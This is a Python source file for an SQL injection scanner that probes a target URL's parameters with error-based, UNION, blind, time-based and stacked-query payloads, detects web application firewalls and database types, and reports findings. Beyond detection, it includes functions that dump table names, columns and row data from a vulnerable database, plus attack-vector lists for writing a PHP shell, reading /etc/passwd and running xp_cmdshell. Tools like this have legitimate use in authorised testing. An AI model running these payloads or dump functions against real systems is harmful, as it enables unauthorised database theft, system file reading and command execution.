import re
import time
import requests
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

console = Console()


class SQLiScanner:
    ERROR_PATTERNS = {
        "MySQL": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[42000\]",
            r"mysql_num_rows",
            r"mysql_fetch",
            r"Supplied argument is not a valid MySQL",
            r"Result is not a MySQL",
        ],
        "PostgreSQL": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"unterminated quoted string",
            r"pg_query\(\) expects",
        ],
        "MSSQL": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"\bSQL Server[^&lt;]+Driver",
            r"Warning.*mssql_",
            r"\bSQL Server[^&lt;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SqlException",
        ],
        "SQLite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error",
            r"SQLITE_MISUSE",
            r"near \".*\": syntax error",
        ],
        "Oracle": [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Warning.*ora_",
            r"ORA-01756",
            r"ORA-00933",
            r"quoted string not properly terminated",
        ],
    }

    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "0 UNION SELECT NULL--",
        "0 UNION SELECT NULL,NULL--",
        "0 UNION SELECT NULL,NULL,NULL--",
        "') UNION SELECT NULL,NULL,NULL--",
        "') UNION SELECT NULL,NULL,NULL,NULL--",
        "') UNION SELECT 1,2,3--",
        "1) UNION SELECT NULL--",
        "1) UNION SELECT NULL,NULL--",
        "1) UNION SELECT NULL,NULL,NULL--",
    ]

    TIME_PAYLOADS = [
        ("' AND SLEEP(5)--", 5),
        ("' AND SLEEP(10)--", 10),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' AND PG_SLEEP(5)--", 5),
        ("1 AND SLEEP(5)", 5),
        ("1' AND SLEEP(5)--", 5),
        ("1' OR SLEEP(5)--", 5),
        ("'; SELECT SLEEP(5);--", 5),
        ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
    ]

    BLIND_TRUE_FALSE = [
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1'--", "1' AND '1'='2'--"),
        ("' AND 1=1#", "' AND 1=2#"),
        ("1 AND 1=1--", "1 AND 1=2--"),
        ("1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1"),
    ]

    COMMON_PARAMS = ["id", "user", "uid", "page", "search", "q", "query", "cat", "item", "product", "name", "email", "pass", "password", "token", "sort", "order", "limit", "offset", "table", "column", "file", "path", "action", "cmd", "exec", "command"]

    def __init__(self, url: str, method: str = "GET", data: Optional[dict] = None, headers: Optional[dict] = None, cookies: Optional[dict] = None, timeout: int = 10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.vulnerable = False
        self.vuln_type = ""
        self.db_type = ""
        self.injectable_params = []
        self.findings = []
        self.confidence = 0
        self.risk_level = "NONE"
        self.recommendations = []
        self.attack_vectors = []
        self.waf_detected = False
        self.waf_name = ""

    def _send(self, payload: str, param: str, use_data: bool = False) -> requests.Response:
        parsed = urlparse(self.url)
        if use_data or self.method == "POST":
            test_data = self.data.copy()
            test_data[param] = payload
            return requests.request(
                self.method,
                self.url,
                data=test_data,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return requests.get(
                new_url,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        waf_signatures = {
            "Cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cf-cache-status"],
            "Akamai": [r"akamai", r"akamaighost", r"_abck", r"ak_bmsc"],
            "AWS WAF": [r"awselb", r"x-amzn-requestid", r"awswaf"],
            "ModSecurity": [r"mod_security", r"modsecurity", r"NOYB"],
            "Imperva": [r"incap_ses", r"visid_incap", r"imperva"],
            "F5 BIG-IP": [r"bigip", r"tsessionid", r"BIGipServer"],
            "Sucuri": [r"sucuri", r"cloudproxy"],
            "Wordfence": [r"wordfence", r"wf_", r"wordfenceLogedIn"],
            "Barracuda": [r"barra_counter_session", r"barracuda_"],
        }
        headers_text = str(response.headers).lower()
        body_text = response.text.lower()[:5000]
        for waf, patterns in waf_signatures.items():
            for pattern in patterns:
                if re.search(pattern, headers_text) or re.search(pattern, body_text):
                    return waf
        if response.status_code in [403, 406, 429, 501]:
            if any(k in headers_text for k in ["server:", "x-powered-by:", "x-cache:"]):
                return "Unknown WAF (possible)"
        return None

    def _detect_db(self, response: requests.Response) -> Optional[str]:
        text = response.text + str(response.headers)
        for db, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return db
        return None

    def _check_error_based(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": []}
        payloads = ["'", "''", "\"", "\"\"", "\\", "')", "'))", "1 OR 1=1", "1' OR '1'='1", "1' OR 1=1--", "' OR ''='"]
        baseline = self._send("1", param)
        baseline_len = len(baseline.text)
        baseline_status = baseline.status_code

        for payload in payloads:
            try:
                resp = self._send(payload, param)
                db = self._detect_db(resp)
                if db:
                    result["vulnerable"] = True
                    result["db_type"] = db
                    result["confidence"] = min(95, 70 + len(result["evidence"]) * 5)
                    result["evidence"].append(f"DB error detected ({db}) with payload: {payload}")
                    return result
                if resp.status_code != baseline_status:
                    text_lower = resp.text.lower()
                    error_keywords = ["error", "warning", "syntax", "mysql", "sql", "query", "exception", "unterminated", "invalid"]
                    if any(e in text_lower for e in error_keywords):
                        result["vulnerable"] = True
                        result["db_type"] = "Unknown"
                        result["confidence"] = 60
                        result["evidence"].append(f"Status code changed ({baseline_status} -> {resp.status_code}) with error keywords")
                        return result
                if len(resp.text) != baseline_len:
                    text_lower = resp.text.lower()
                    if any(e in text_lower for e in ["error", "warning", "syntax"]):
                        result["vulnerable"] = True
                        result["db_type"] = "Unknown"
                        result["confidence"] = 55
                        result["evidence"].append(f"Response length changed with error content")
                        return result
            except requests.RequestException:
                continue
        return result

    def _check_union(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": [], "columns": 0}
        baseline = self._send("1", param)
        for payload in self.UNION_PAYLOADS:
            try:
                resp = self._send(payload, param)
                if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 1.2:
                    db = self._detect_db(resp)
                    cols = payload.count(",")
                    result["vulnerable"] = True
                    result["db_type"] = db or "Unknown"
                    result["confidence"] = 80
                    result["columns"] = cols
                    result["evidence"].append(f"UNION payload returned extra data ({len(resp.text)} vs {len(baseline.text)} bytes)")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_time_based(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": [], "delay": 0}
        for payload, delay in self.TIME_PAYLOADS:
            try:
                start = time.time()
                self._send(payload, param)
                elapsed = time.time() - start
                if elapsed >= delay - 1:
                    result["vulnerable"] = True
                    result["db_type"] = "Time-based"
                    result["confidence"] = 85
                    result["delay"] = elapsed
                    result["evidence"].append(f"Response delayed {elapsed:.1f}s (expected {delay}s)")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_blind(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": []}
        for true_payload, false_payload in self.BLIND_TRUE_FALSE:
            try:
                true_resp = self._send(true_payload, param)
                false_resp = self._send(false_payload, param)
                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                if true_resp.status_code == false_resp.status_code and true_len != false_len:
                    diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
                    result["vulnerable"] = True
                    result["db_type"] = "Boolean-based blind"
                    result["confidence"] = min(90, 60 + int(diff_ratio * 100))
                    result["evidence"].append(f"True response: {true_len} bytes, False response: {false_len} bytes (diff: {diff_ratio:.0%})")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_stacked(self, param: str) -> dict:
        result = {"vulnerable": False, "confidence": 0, "evidence": []}
        payloads = ["'; SELECT 1--", "'; SELECT SLEEP(1)--", "1; SELECT 1--"]
        for payload in payloads:
            try:
                start = time.time()
                resp = self._send(payload, param)
                elapsed = time.time() - start
                if elapsed > 1 or resp.status_code == 500:
                    result["vulnerable"] = True
                    result["confidence"] = 40
                    result["evidence"].append(f"Stacked query may execute ({elapsed:.1f}s)")
                    return result
            except requests.RequestException:
                continue
        return result

    def _get_params(self) -> list:
        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        if not params and self.method == "GET":
            params = self.COMMON_PARAMS[:5]
        if self.method == "POST" and self.data:
            params.extend(list(self.data.keys()))
        return list(set(params)) or self.COMMON_PARAMS[:5]

    def scan(self) -> dict:
        console.print(Panel("[bold cyan]SQL Injection Scanner[/bold cyan]", border_style="cyan"))
        params = self._get_params()
        results = {
            "url": self.url,
            "method": self.method,
            "vulnerable": False,
            "vuln_type": "",
            "db_type": "",
            "injectable_params": [],
            "confidence": 0,
            "risk_level": "NONE",
            "waf_detected": None,
            "findings": [],
            "recommendations": [],
            "attack_vectors": [],
        }

        test_resp = self._send("1", params[0])
        waf = self._detect_waf(test_resp)
        if waf:
            results["waf_detected"] = waf
            self.waf_detected = True
            self.waf_name = waf
            console.print(f"  [yellow]WAF detected:[/yellow] {waf}")
            results["findings"].append(f"WAF detected: {waf} - some tests may be blocked")

        for param in params:
            console.print(f"  [yellow]Testing parameter:[/yellow] {param}")

            checks = [
                ("Error-based", self._check_error_based),
                ("UNION-based", self._check_union),
                ("Boolean-blind", self._check_blind),
                ("Time-based", self._check_time_based),
                ("Stacked queries", self._check_stacked),
            ]

            for check_name, check_fn in checks:
                try:
                    check_result = check_fn(param)
                    if check_result["vulnerable"]:
                        results["vulnerable"] = True
                        results["injectable_params"].append(param)
                        results["vuln_type"] = check_name
                        results["db_type"] = check_result.get("db_type", "Unknown")
                        results["confidence"] = max(results["confidence"], check_result["confidence"])
                        results["findings"].extend(check_result.get("evidence", []))
                        console.print(f"    [bold red]VULNERABLE![/bold red] {check_name} (confidence: {check_result['confidence']}%)")
                        break
                    else:
                        console.print(f"    [green]Not vulnerable[/green] ({check_name})")
                except Exception as e:
                    console.print(f"    [dim]Error testing {check_name}: {e}[/dim]")

        if results["vulnerable"]:
            results["risk_level"] = "CRITICAL" if results["confidence"] >= 80 else "HIGH" if results["confidence"] >= 60 else "MEDIUM"
            results["recommendations"] = self._generate_recommendations(results)
            results["attack_vectors"] = self._generate_attack_vectors(results)
        else:
            results["risk_level"] = "LOW"
            results["recommendations"] = self._generate_safe_recommendations(results)

        self.vulnerable = results["vulnerable"]
        self.vuln_type = results["vuln_type"]
        self.db_type = results["db_type"]
        self.injectable_params = results["injectable_params"]
        self.confidence = results["confidence"]
        self.risk_level = results["risk_level"]
        return results

    def _generate_recommendations(self, results: dict) -> list:
        recs = [
            "Use parameterized queries (prepared statements) instead of string concatenation",
            "Implement input validation and sanitization on all user inputs",
            "Apply the principle of least privilege to database accounts",
            "Enable WAF rules specifically for SQL injection patterns",
            "Use an ORM framework that handles parameterization automatically",
        ]
        if results["db_type"] in ["MySQL", "PostgreSQL", "SQLite"]:
            recs.append(f"Specific to {results['db_type']}: Use native prepared statement API")
        if results["vuln_type"] == "UNION-based":
            recs.append("Restrict database user permissions - prevent SELECT on information_schema")
        if results["vuln_type"] == "Time-based":
            recs.append("Time-based injection often bypasses basic WAF rules - review WAF configuration")
        return recs

    def _generate_attack_vectors(self, results: dict) -> list:
        vectors = []
        if results["db_type"] == "MySQL":
            vectors = [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT user(),database(),version()--",
                "' INTO OUTFILE '/tmp/shell.php'--",
                "LOAD_FILE('/etc/passwd')",
            ]
        elif results["db_type"] == "PostgreSQL":
            vectors = [
                "' UNION SELECT tablename FROM pg_tables--",
                "' UNION SELECT version()--",
                "' UNION SELECT current_user--",
                "pg_read_file('/etc/passwd')",
            ]
        elif results["db_type"] == "MSSQL":
            vectors = [
                "' UNION SELECT name FROM sysobjects--",
                "' UNION SELECT name FROM syscolumns--",
                "' UNION SELECT @@version--",
                "xp_cmdshell 'whoami'",
            ]
        else:
            vectors = [
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "' OR '1'='1",
            ]
        return vectors

    def _generate_safe_recommendations(self, results: dict) -> list:
        recs = [
            "No SQL injection vulnerabilities detected with current tests",
            "Consider testing with a more comprehensive payload list",
            "Test for NoSQL injection if MongoDB/Redis is used",
            "Check for ORM-specific injection patterns",
            "Test for second-order SQL injection (stored inputs)",
        ]
        if results["waf_detected"]:
            recs.append(f"WAF ({results['waf_detected']}) detected - may be blocking payloads, try bypass techniques")
        return recs

    def dump_tables(self, param: str, num_cols: int = 3) -> list:
        console.print(f"[cyan]Attempting table dump via parameter: {param}[/cyan]")
        tables = []
        payload = f"' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"
        try:
            resp = self._send(payload, param)
            table_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in table_pattern:
                tables.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return tables

    def dump_columns(self, param: str, table: str) -> list:
        console.print(f"[cyan]Attempting column dump for table: {table}[/cyan]")
        columns = []
        payload = f"' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'--"
        try:
            resp = self._send(payload, param)
            col_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in col_pattern:
                columns.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return columns

    def dump_data(self, param: str, table: str, columns: list) -> list:
        console.print(f"[cyan]Attempting data dump: {table} ({', '.join(columns)})[/cyan]")
        col_str = ",".join(columns)
        payload = f"' UNION SELECT NULL,group_concat({col_str} separator '|||'),NULL FROM {table}--"
        data = []
        try:
            resp = self._send(payload, param)
            rows = resp.text.split("|||")
            data = [r.strip() for r in rows if r.strip()]
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return data

    def print_results(self, results: dict):
        risk_colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green", "NONE": "green"}
        risk_color = risk_colors.get(results["risk_level"], "white")

        table = Table(title="SQL Injection Analysis Report", border_style="cyan")
        table.add_column("Property", style="bold")
        table.add_column("Value")
        table.add_row("URL", results["url"])
        table.add_row("Method", results["method"])
        table.add_row("Vulnerable", "[bold red]YES[/bold red]" if results["vulnerable"] else "[green]NO[/green]")
        if results["vulnerable"]:
            table.add_row("Type", results["vuln_type"])
            table.add_row("Database", results["db_type"])
            table.add_row("Injectable Params", ", ".join(results["injectable_params"]))
            table.add_row("Confidence", f"{results['confidence']}%")
        table.add_row("Risk Level", f"[{risk_color}]{results['risk_level']}[/{risk_color}]")
        if results["waf_detected"]:
            table.add_row("WAF", results["waf_detected"])
        console.print(table)

        if results["findings"]:
            console.print("\n[bold]Findings:[/bold]")
            for f in results["findings"]:
                console.print(f"  [cyan]->[/cyan] {f}")

        if results["recommendations"]:
            console.print("\n[bold]Recommendations:[/bold]")
            for i, r in enumerate(results["recommendations"], 1):
                console.print(f"  {i}. {r}")

        if results["attack_vectors"]:
            console.print("\n[bold]Attack Vectors:[/bold]")
            for v in results["attack_vectors"]:
                console.print(f"  [red]![/red] {v}")
